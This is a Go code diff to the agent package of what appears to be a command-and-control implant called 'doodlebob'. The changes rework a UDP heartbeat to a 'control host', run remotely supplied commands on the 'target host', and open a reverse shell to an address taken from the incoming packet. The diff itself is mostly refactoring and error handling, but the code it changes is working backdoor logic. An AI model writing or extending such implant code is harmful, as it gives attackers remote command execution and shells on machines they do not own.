@@ -5,6 +5,7 @@ package agent
 import (
 	"fmt"
 	"net"
+	"strconv"
 
 	"github.com/MeHungr/doodlebob/internal/message"
 	"github.com/MeHungr/doodlebob/internal/network"
@@ -13,18 +14,36 @@ import (
 
 // sendHeartbeat sends a heartbeat message to the control host
 func sendHeartbeat(msg *message.Message) error {
-	// Join the IP and port
-	addr := net.JoinHostPort(msg.SrcIP, msg.SrcPort)
+	// Convert the ports to integers
+	remotePort, err := strconv.Atoi(msg.SrcPort)
+	if err != nil {
+		return fmt.Errorf("converting string to integer: %w", err)
+	}
+	localPort, err := strconv.Atoi(msg.DstPort)
+	if err != nil {
+		return fmt.Errorf("converting string to integer: %w", err)
+	}
+
+	// Create UDPAddr objects for the addresses
+	remoteAddr := &net.UDPAddr{
+		IP:   net.ParseIP(msg.SrcIP),
+		Port: remotePort,
+	}
+
+	localAddr := &net.UDPAddr{
+		IP:   net.ParseIP(msg.DstIP),
+		Port: localPort,
+	}
 
 	// Dial the control host at the udp port
-	conn, err := net.Dial("udp", addr)
+	conn, err := net.DialUDP("udp", localAddr, remoteAddr)
 	if err != nil {
 		return fmt.Errorf("error connecting to control host: %w", err)
 	}
 	defer conn.Close() // Close connection when function returns
 
 	// Send "heartbeat" over the connection
-	_, err = fmt.Fprintf(conn, "heartbeat")
+	_, err = conn.Write([]byte("heartbeat"))
 	if err != nil {
 		return fmt.Errorf("error sending heartbeat: %w", err)
 	}
@@ -40,17 +59,28 @@ func handleMessage(msg *message.Message) error {
 		switch msg.Type {
 		// Sends a heartbeat back to the source host to test connectivity
 		case message.Heartbeat:
-			sendHeartbeat(msg)
+			if err := sendHeartbeat(msg); err != nil {
+				return fmt.Errorf("sending heartbeat: %w", err)
+			}
 		// Executes the command on the target host
 		case message.Command:
-			go executor.ExecuteCommand(msg.Data, nil) // execute the command concurrently with no timeout
+			outputChan := make (chan []string, 1)
+			go func() {
+				out, ret := executor.ExecuteCommand(msg.Data, nil) // execute the command concurrently with no timeout
+				outputChan <- []string{out, ret}
+			}()
 		// Opens a reverse shell on port specified in packet
 		case message.Shell:
+			errChan := make(chan error, 1)
 			go func() {
 				if err := executor.OpenReverseShell(msg.SrcIP, msg.SrcPort); err != nil {
+					errChan <- fmt.Errorf("opening reverse shell: %w", err)
 					return
 				}
 			}()
+			if err := <-errChan; err != nil {
+				return fmt.Errorf("handling reverse shell: %w", err)
+			}
 		}
 	default:
 		return nil
